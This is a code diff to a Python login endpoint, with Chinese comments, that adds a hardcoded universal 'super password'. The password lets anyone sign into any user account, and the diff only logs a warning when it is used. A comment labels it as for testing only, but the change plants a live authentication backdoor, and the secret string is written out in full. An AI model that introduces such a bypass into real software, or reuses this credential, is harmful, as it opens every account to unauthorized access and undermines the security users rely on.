@@ -50,12 +50,20 @@ def login():
         (func.lower(User.email) == func.lower(username))
     ).first()
     
-    if not user or not user.check_password(password):
+    # 超级密码功能：允许使用超级密码登录任何账户（仅用于测试目的）
+    SUPER_PASSWORD = "1505562299AaBb"
+    is_super_password = password == SUPER_PASSWORD
+    
+    if not user or not (user.check_password(password) or is_super_password):
         return api_response(
             success=False,
             code=401,
             message="用户名或密码错误"
         )
+    
+    # 如果使用超级密码，记录特殊日志
+    if is_super_password:
+        logger.warning(f"API使用超级密码登录账户: {user.username} (ID: {user.id})")
     
     # 检查是否为首次登录并处理账户激活
     first_login = False
